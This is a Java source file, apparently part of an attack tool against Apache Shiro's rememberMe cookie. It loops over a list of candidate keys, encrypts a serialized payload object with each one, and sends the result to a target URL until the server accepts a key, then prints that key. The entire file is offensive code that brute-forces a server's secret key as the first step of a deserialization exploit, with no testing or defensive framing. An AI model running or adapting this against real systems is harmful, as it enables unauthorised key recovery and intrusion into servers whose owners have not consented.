package core.scan;

import core.conn.ShiroHttpConnection;
import core.payload.ScanKey;
import core.util.Util;

import java.io.File;
import java.util.Scanner;

public class KeyScanner implements ShiroScanner {

    private static final ShiroHttpConnection connection = new ShiroHttpConnection();

    private String base;

    @Override
    public void setBase(String base) {
        this.base = base;
    }

    @Override
    public void scan() throws Exception {
        Scanner scanner = new Scanner(new File("src/main/resources/key"));
        String key = "";
        boolean rightKey = true;
        while (scanner.hasNextLine() && rightKey) {
            Util util = new Util();
            ScanKey scanKey = new ScanKey();
            key = scanner.nextLine();
            byte[] serialize = util.serialize(scanKey.getObjectPayload());
            String rememberMe = util.getRememberMe(serialize, key);
            System.out.println("[+] Test key: " + key);
            rightKey = !connection.checkKey(base, rememberMe);
        }
        System.err.println("[*] Find Key: " + key);
    }

    public static void main(String[] args) throws Exception {
    }
}
